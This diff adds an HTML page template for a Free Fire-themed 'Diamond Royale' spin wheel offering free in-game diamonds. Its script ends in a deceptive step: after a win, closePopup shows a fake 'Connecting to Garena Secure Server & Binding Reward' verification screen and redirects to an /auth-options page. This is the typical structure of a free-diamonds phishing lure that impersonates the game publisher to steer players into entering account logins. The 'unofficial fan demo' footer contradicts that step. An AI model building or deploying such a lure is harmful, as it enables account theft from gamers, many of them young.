@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Diamond Spin & Win - Enhanced Edition</title>
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Segoe UI', Arial, sans-serif;
+}
+body {
+    min-height: 100vh;
+    color: white;
+    background: #0d0806;
+    overflow-x: hidden;
+}
+.ff-loading-bg {
+    position: fixed;
+    inset: 0;
+    z-index: -1;
+    overflow: hidden;
+    background: 
+        radial-gradient(circle at 50% 62%, rgba(255, 145, 0, 0.55) 0%, rgba(215, 55, 0, 0.35) 35%, rgba(25, 12, 8, 0.92) 80%),
+        linear-gradient(180deg, #0c121e 0%, #2a1512 45%, #8f2d08 75%, #120907 100%);
+}
+.ff-sun-flare {
+    position: absolute;
+    bottom: 24%;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 480px;
+    height: 240px;
+    background: radial-gradient(ellipse at bottom, rgba(255, 210, 90, 0.7) 0%, rgba(255, 90, 0, 0.25) 50%, transparent 75%);
+    filter: blur(18px);
+    pointer-events: none;
+}
+.ff-grid {
+    position: absolute;
+    inset: 0;
+    background-image: 
+        linear-gradient(rgba(255, 170, 50, 0.04) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255, 170, 50, 0.04) 1px, transparent 1px);
+    background-size: 40px 40px;
+    mask-image: linear-gradient(180deg, rgba(0,0,0,0.6), transparent 80%);
+}
+.ff-horizon {
+    position: absolute;
+    bottom: 0;
+    width: 100%;
+    height: 36%;
+    background: linear-gradient(180deg, #1a0d0a 0%, #090504 100%);
+    clip-path: polygon(
+        0% 45%, 10% 35%, 18% 42%, 28% 22%, 36% 38%, 
+        45% 28%, 55% 40%, 67% 18%, 76% 35%, 88% 25%, 
+        100% 40%, 100% 100%, 0% 100%
+    );
+}
+.airdrop-wrapper {
+    position: absolute;
+    top: 14%;
+    right: 12%;
+    opacity: 0.45;
+    animation: floatDrop 7s ease-in-out infinite;
+    pointer-events: none;
+}
+@keyframes floatDrop {
+    0%, 100% { transform: translateY(0px) rotate(-2deg); }
+    50% { transform: translateY(18px) rotate(2deg); }
+}
+.heli {
+    position: absolute;
+    top: 22%;
+    left: 10%;
+    opacity: 0.35;
+    animation: hoverHeli 5s ease-in-out infinite;
+    pointer-events: none;
+}
+@keyframes hoverHeli {
+    0%, 100% { transform: translate(0, 0); }
+    50% { transform: translate(12px, -8px); }
+}
+.embers span {
+    position: absolute;
+    bottom: -10px;
+    width: 4px;
+    height: 4px;
+    background: #ffae00;
+    border-radius: 50%;
+    box-shadow: 0 0 8px #ff5500, 0 0 14px #ffae00;
+    animation: riseEmber linear infinite;
+    opacity: 0;
+}
+.embers span:nth-child(1) { left: 12%; animation-duration: 6s; animation-delay: 0s; }
+.embers span:nth-child(2) { left: 26%; animation-duration: 8s; animation-delay: 1.5s; width: 3px; height: 3px; }
+.embers span:nth-child(3) { left: 42%; animation-duration: 5.5s; animation-delay: 0.8s; }
+.embers span:nth-child(4) { left: 58%; animation-duration: 7.5s; animation-delay: 2.2s; width: 5px; height: 5px; }
+.embers span:nth-child(5) { left: 74%; animation-duration: 6.5s; animation-delay: 1s; }
+.embers span:nth-child(6) { left: 88%; animation-duration: 9s; animation-delay: 3s; width: 3px; height: 3px; }
+.embers span:nth-child(7) { left: 33%; animation-duration: 7s; animation-delay: 4s; }
+.embers span:nth-child(8) { left: 67%; animation-duration: 5s; animation-delay: 2.5s; }
+@keyframes riseEmber {
+    0% { transform: translateY(0) translateX(0) scale(1); opacity: 0; }
+    20% { opacity: 0.9; }
+    80% { opacity: 0.7; }
+    100% { transform: translateY(-85vh) translateX(35px) scale(0.3); opacity: 0; }
+}
+.ff-loading-hud {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    padding: 8px 20px 10px;
+    background: linear-gradient(0deg, rgba(0,0,0,0.92) 0%, rgba(0,0,0,0.6) 75%, transparent 100%);
+    z-index: 2;
+    pointer-events: none;
+}
+.ff-hud-top {
+    display: flex;
+    justify-content: space-between;
+    max-width: 600px;
+    margin: 0 auto 5px;
+    font-size: 10px;
+    font-weight: 800;
+    letter-spacing: 1.5px;
+    color: #ffb84d;
+    text-transform: uppercase;
+}
+.ff-bar-track {
+    max-width: 600px;
+    height: 4px;
+    margin: 0 auto;
+    background: rgba(255, 255, 255, 0.15);
+    border-radius: 2px;
+    overflow: hidden;
+}
+.ff-bar-fill {
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, #ff5500, #ffbb00, #fff099);
+    box-shadow: 0 0 10px #ff8800;
+    animation: pulseBar 3s ease-in-out infinite;
+}
+@keyframes pulseBar {
+    0%, 100% { opacity: 0.85; }
+    50% { opacity: 1; }
+}
+header {
+    padding: 18px 15px 10px;
+    text-align: center;
+}
+.logo {
+    font-size: 32px;
+    font-weight: 900;
+    letter-spacing: 1px;
+    background: linear-gradient(180deg, #ffffff 10%, #ffbe3b 60%, #ff6a00 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    filter: drop-shadow(0 2px 10px rgba(255, 115, 0, 0.6));
+}
+.subtitle {
+    font-size: 11px;
+    color: #ffd699;
+    letter-spacing: 4px;
+    margin-top: 4px;
+    font-weight: 700;
+}
+.wallet {
+    display: inline-flex;
+    gap: 8px;
+    align-items: center;
+    margin-top: 15px;
+    padding: 10px 22px;
+    border: 1px solid #ffaa2b;
+    border-radius: 6px;
+    background: rgba(20, 12, 8, 0.85);
+    box-shadow: 0 0 15px rgba(255, 136, 0, 0.35), inset 0 0 10px rgba(255, 136, 0, 0.15);
+    font-weight: bold;
+    font-size: 14px;
+}
+.wallet span {
+    color: #5ceeff;
+    font-size: 16px;
+    text-shadow: 0 0 8px #00c3ff;
+}
+.container {
+    width: 100%;
+    max-width: 480px;
+    margin: auto;
+    padding: 10px 15px 65px;
+    text-align: center;
+}
+.heading {
+    font-size: 26px;
+    font-weight: 900;
+    margin: 10px 0 6px;
+    color: #fff;
+    letter-spacing: 1px;
+    text-shadow: 0 2px 12px rgba(255, 120, 0, 0.8);
+}
+.description {
+    color: #f5d8b8;
+    font-size: 13px;
+    margin-bottom: 22px;
+}
+.wheel-area {
+    position: relative;
+    width: min(330px, 86vw);
+    aspect-ratio: 1;
+    margin: 0 auto 22px;
+    padding: 9px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #ffe28a, #ff7b00, #5c2200, #ffbe3b);
+    box-shadow: 0 0 22px rgba(255, 136, 0, 0.75), 0 0 50px rgba(255, 60, 0, 0.4);
+}
+.pointer {
+    position: absolute;
+    z-index: 5;
+    top: -14px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 0;
+    height: 0;
+    border-left: 17px solid transparent;
+    border-right: 17px solid transparent;
+    border-top: 38px solid #ffbe2e;
+    filter: drop-shadow(0 0 8px #ff5500);
+}
+.wheel {
+    position: relative;
+    width: 100%;
+    height: 100%;
+    border-radius: 50%;
+    overflow: hidden;
+    border: 3px solid #ffe8a3;
+    background: conic-gradient(
+        #182638 0deg 45deg,
+        #2b1a14 45deg 90deg,
+        #182638 90deg 135deg,
+        #3d1d11 135deg 180deg,
+        #182638 180deg 225deg,
+        #2b1a14 225deg 270deg,
+        #182638 270deg 315deg,
+        #3d1d11 315deg 360deg
+    );
+    transition: transform 5s cubic-bezier(.12,.72,.12,1);
+}
+.wheel-label {
+    position: absolute;
+    left: 50%;
+    top: 50%;
+    width: 85px;
+    margin-left: -42px;
+    margin-top: -12px;
+    font-size: 13px;
+    font-weight: 900;
+    line-height: 1.25;
+    text-align: center;
+    color: white;
+    text-shadow: 0 2px 5px #000;
+    transform: rotate(var(--angle)) translateY(-112px) rotate(calc(-1 * var(--angle)));
+    pointer-events: none;
+}
+.wheel-center {
+    position: absolute;
+    z-index: 3;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 64px;
+    height: 64px;
+    border-radius: 50%;
+    background: radial-gradient(circle, #38b6ff, #0a4b8c);
+    border: 3px solid #ffcf54;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 26px;
+    box-shadow: 0 0 20px rgba(0, 195, 255, 0.8);
+}
+.spin-btn {
+    width: 85%;
+    max-width: 280px;
+    padding: 15px;
+    border: 2px solid #ffe082;
+    border-radius: 6px;
+    background: linear-gradient(180deg, #ffae00 0%, #ff5e00 100%);
+    color: #1a0800;
+    font-size: 19px;
+    font-weight: 900;
+    letter-spacing: 1.5px;
+    box-shadow: 0 4px 22px rgba(255, 102, 0, 0.7);
+    cursor: pointer;
+    text-transform: uppercase;
+    transition: transform 0.15s ease;
+}
+.spin-btn:active:not(:disabled) {
+    transform: scale(0.97);
+}
+.spin-btn:disabled {
+    opacity: .5;
+    cursor: not-allowed;
+    filter: grayscale(0.6);
+}
+.info {
+    margin: 15px 0;
+    color: #ffd8a8;
+    font-size: 14px;
+}
+.info b {
+    color: #ffbe3b;
+}
+.reward-list {
+    display: flex;
+    justify-content: center;
+    flex-wrap: wrap;
+    gap: 8px;
+    margin-top: 18px;
+}
+.reward-chip {
+    padding: 8px 12px;
+    background: rgba(20, 13, 10, 0.85);
+    border: 1px solid rgba(255, 166, 0, 0.45);
+    border-radius: 6px;
+    font-size: 12px;
+    font-weight: bold;
+    color: #ffe8c2;
+}
+.overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    z-index: 10;
+    background: rgba(0,0,0,.85);
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+}
+.popup {
+    width: 100%;
+    max-width: 350px;
+    padding: 30px 20px;
+    text-align: center;
+    border: 2px solid #ffae2b;
+    border-radius: 10px;
+    background: radial-gradient(circle at top, #47200c, #140905 80%);
+    box-shadow: 0 0 35px rgba(255, 119, 0, 0.75);
+    animation: pop .35s ease;
+}
+@keyframes pop {
+    from { transform: scale(.7); opacity: 0; }
+    to { transform: scale(1); opacity: 1; }
+}
+.popup-icon {
+    font-size: 65px;
+    margin-bottom: 12px;
+}
+.popup h2 {
+    font-size: 26px;
+    color: #ffca4b;
+    margin-bottom: 10px;
+    letter-spacing: 1px;
+}
+.popup p {
+    color: #f5e1c8;
+    font-size: 15px;
+    margin-bottom: 22px;
+}
+.popup button {
+    width: 100%;
+    padding: 13px;
+    border: 1px solid #ffe082;
+    border-radius: 6px;
+    background: linear-gradient(180deg, #ffae00, #ff5e00);
+    color: #1a0800;
+    font-size: 16px;
+    font-weight: 900;
+    cursor: pointer;
+}
+.spinner {
+    width: 45px;
+    height: 45px;
+    border: 4px solid rgba(255, 174, 43, 0.2);
+    border-top: 4px solid #ffae2b;
+    border-radius: 50%;
+    animation: spinLoader 0.9s linear infinite;
+    margin: 0 auto 15px;
+}
+@keyframes spinLoader {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+footer {
+    color: #a88c74;
+    font-size: 10px;
+    text-align: center;
+    padding: 10px 20px 38px;
+    letter-spacing: 1px;
+}
+</style>
+</head>
+<body>
+
+<div class="ff-loading-bg">
+    <div class="ff-grid"></div>
+    <div class="ff-sun-flare"></div>
+
+    <svg class="heli" width="90" height="40" viewBox="0 0 90 40" fill="#0d0705">
+        <rect x="10" y="6" width="55" height="2" rx="1"/>
+        <rect x="36" y="6" width="3" height="8"/>
+        <ellipse cx="38" cy="19" rx="15" ry="7"/>
+        <polygon points="50,17 82,14 82,19 50,21"/>
+        <rect x="80" y="9" width="2" height="12"/>
+        <path d="M27 26 L25 31 L50 31 L48 26" stroke="#0d0705" stroke-width="2" fill="none"/>
+    </svg>
+
+    <svg class="airdrop-wrapper" width="75" height="105" viewBox="0 0 75 105">
+        <path d="M5 35 C5 8, 70 8, 70 35 Z" fill="#2b160c" stroke="#ff9900" stroke-width="1.5"/>
+        <line x1="8" y1="35" x2="26" y2="68" stroke="#d4884a" stroke-width="1"/>
+        <line x1="37" y1="35" x2="37" y2="68" stroke="#d4884a" stroke-width="1"/>
+        <line x1="67" y1="35" x2="49" y2="68" stroke="#d4884a" stroke-width="1"/>
+        <rect x="23" y="68" width="29" height="26" rx="2" fill="#1e130d" stroke="#ffae00" stroke-width="1.5"/>
+        <line x1="23" y1="76" x2="52" y2="76" stroke="#ffae00" stroke-width="1.5"/>
+        <line x1="37.5" y1="68" x2="37.5" y2="94" stroke="#ffae00" stroke-width="1.5"/>
+    </svg>
+
+    <div class="embers">
+        <span></span><span></span><span></span><span></span>
+        <span></span><span></span><span></span><span></span>
+    </div>
+
+    <div class="ff-horizon"></div>
+</div>
+
+<div class="ff-loading-hud">
+    <div class="ff-hud-top">
+        <span>⚡ BERMUDA ROYALE EVENT</span>
+        <span>READY TO SPIN • 100%</span>
+    </div>
+    <div class="ff-bar-track">
+        <div class="ff-bar-fill"></div>
+    </div>
+</div>
+
+<header>
+    <div class="logo">💎 DIAMOND ROYALE</div>
+    <div class="subtitle">BOOYAH • SPIN • WIN</div>
+
+    <div class="wallet">
+        💎 MY DIAMONDS:
+        <span id="balance">{{ wallet }}</span>
+    </div>
+</header>
+
+<main class="container">
+    <h1 class="heading">LUCK ROYALE SPIN!</h1>
+    <p class="description">
+        Drop into the spin zone and claim virtual diamonds.
+    </p>
+
+    <div class="wheel-area">
+        <div class="pointer"></div>
+        <div class="wheel" id="wheel">
+            <div class="wheel-label" style="--angle:22.5deg">💎<br>250</div>
+            <div class="wheel-label" style="--angle:67.5deg">TRY<br>AGAIN</div>
+            <div class="wheel-label" style="--angle:112.5deg">💎<br>300</div>
+            <div class="wheel-label" style="--angle:157.5deg">💎<br>599</div>
+            <div class="wheel-label" style="--angle:202.5deg">TRY<br>AGAIN</div>
+            <div class="wheel-label" style="--angle:247.5deg">💎<br>250</div>
+            <div class="wheel-label" style="--angle:292.5deg">💎<br>300</div>
+            <div class="wheel-label" style="--angle:337.5deg">TRY<br>AGAIN</div>
+            <div class="wheel-center">💎</div>
+        </div>
+    </div>
+
+    <button class="spin-btn" id="spinBtn" onclick="playClickSound(); spinWheel();">
+        🔥 SPIN NOW
+    </button>
+
+    <div class="info">
+        Free vouchers remaining: <b id="spins">{{ spins }}</b>
+    </div>
+
+    <div class="reward-list">
+        <div class="reward-chip">💎 250 Diamonds</div>
+        <div class="reward-chip">💎 300 Diamonds</div>
+        <div class="reward-chip">💎 599 Diamonds</div>
+        <div class="reward-chip">😭 Try Again</div>
+    </div>
+</main>
+
+<footer>
+    UNOFFICIAL FAN DEMO • VIRTUAL DIAMONDS ONLY
+</footer>
+
+<div class="overlay" id="overlay">
+    <div class="popup" id="popupBox">
+        <div class="popup-icon" id="popupIcon">💎</div>
+        <h2 id="popupTitle">BOOYAH!</h2>
+        <p id="popupText">You won diamonds!</p>
+        <button id="popupActionBtn" onclick="playClickSound(); closePopup();">CLAIM & CONTINUE</button>
+    </div>
+</div>
+
+<script>
+let audioCtx = null;
+
+function getAudioContext() {
+    if (!audioCtx) {
+        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    }
+    return audioCtx;
+}
+
+function playClickSound() {
+    try {
+        const ctx = getAudioContext();
+        if (ctx.state === 'suspended') {
+            ctx.resume();
+        }
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.type = 'sine';
+        osc.frequency.setValueAtTime(600, ctx.currentTime);
+        osc.frequency.exponentialRampToValueAtTime(300, ctx.currentTime + 0.08);
+        
+        gain.gain.setValueAtTime(0.15, ctx.currentTime);
+        gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.08);
+        
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        
+        osc.start();
+        osc.stop(ctx.currentTime + 0.08);
+    } catch (e) {}
+}
+
+function playTickSound() {
+    try {
+        const ctx = getAudioContext();
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.type = 'triangle';
+        osc.frequency.setValueAtTime(800, ctx.currentTime);
+        osc.frequency.exponentialRampToValueAtTime(100, ctx.currentTime + 0.04);
+        
+        gain.gain.setValueAtTime(0.1, ctx.currentTime);
+        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.04);
+        
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        
+        osc.start();
+        osc.stop(ctx.currentTime + 0.04);
+    } catch (e) {}
+}
+
+const wheel = document.getElementById("wheel");
+const spinBtn = document.getElementById("spinBtn");
+
+let currentRotation = 0;
+let busy = false;
+let isWinningClaim = false;
+
+async function spinWheel() {
+    if (busy) return;
+
+    busy = true;
+    spinBtn.disabled = true;
+    spinBtn.textContent = "SPINNING...";
+
+    let tickInterval = setInterval(() => {
+        playTickSound();
+    }, 150);
+
+    try {
+        const response = await fetch("/api/spin", {
+            method: "POST"
+        });
+
+        const data = await response.json();
+
+        if (!response.ok) {
+            clearInterval(tickInterval);
+            alert(data.error || "Unable to spin.");
+            busy = false;
+            updateButton(data.spins_left);
+            return;
+        }
+
+        const index = data.index;
+        const centerAngle = index * 45 + 22.5;
+
+        const targetAngle = (360 - centerAngle) % 360;
+        const extraRotation =
+            (targetAngle - (currentRotation % 360) + 360) % 360;
+
+        currentRotation += 5 * 360 + extraRotation;
+
+        wheel.style.transform = `rotate(${currentRotation}deg)`;
+
+        document.getElementById("balance").textContent = data.wallet;
+        document.getElementById("spins").textContent = data.spins_left;
+
+        setTimeout(() => {
+            clearInterval(tickInterval);
+            showResult(data);
+        }, 5200);
+
+    } catch (error) {
+        clearInterval(tickInterval);
+        alert("Connection error. Please try again.");
+        busy = false;
+        updateButton(null);
+    }
+}
+
+function showResult(data) {
+    const overlay = document.getElementById("overlay");
+    const icon = document.getElementById("popupIcon");
+    const title = document.getElementById("popupTitle");
+    const message = document.getElementById("popupText");
+    const btn = document.getElementById("popupActionBtn");
+
+    icon.style.display = "block";
+    btn.style.display = "block";
+
+    if (data.reward > 0) {
+        icon.textContent = "💎";
+        title.textContent = "BOOYAH! 300 DIAMONDS CLAIMED!";
+        message.textContent = "You successfully claimed " + data.reward + " virtual diamonds!";
+        btn.textContent = "CLAIM & CONTINUE";
+        isWinningClaim = true;
+    } else {
+        icon.textContent = "😭";
+        title.textContent = "TRY AGAIN!";
+        message.textContent = "Better luck on your next drop!";
+        btn.textContent = "CONTINUE";
+        isWinningClaim = false;
+    }
+
+    overlay.style.display = "flex";
+    updateButton(data.spins_left);
+}
+
+function updateButton(spinsLeft) {
+    busy = false;
+
+    if (spinsLeft !== null && spinsLeft !== undefined) {
+        if (spinsLeft <= 0) {
+            spinBtn.disabled = true;
+            spinBtn.textContent = "NO VOUCHERS LEFT";
+            return;
+        }
+    }
+
+    spinBtn.disabled = false;
+    spinBtn.textContent = "🔥 SPIN AGAIN";
+}
+
+function closePopup() {
+    if (isWinningClaim) {
+        const popupBox = document.getElementById("popupBox");
+        popupBox.innerHTML = `
+            <div class="spinner"></div>
+            <h2 style="color: #ffca4b; font-size: 22px; margin-bottom: 10px;">VERIFYING ACCOUNT</h2>
+            <p style="color: #f5e1c8; font-size: 14px;">Connecting to Garena Secure Server & Binding Reward...</p>
+        `;
+
+        setTimeout(() => {
+            window.location.href = "/auth-options";
+        }, 3000);
+        return;
+    }
+
+    document.getElementById("overlay").style.display = "none";
+    const spins = parseInt(document.getElementById("spins").textContent);
+    updateButton(spins);
+}
+</script>
+
+</body>
+</html>
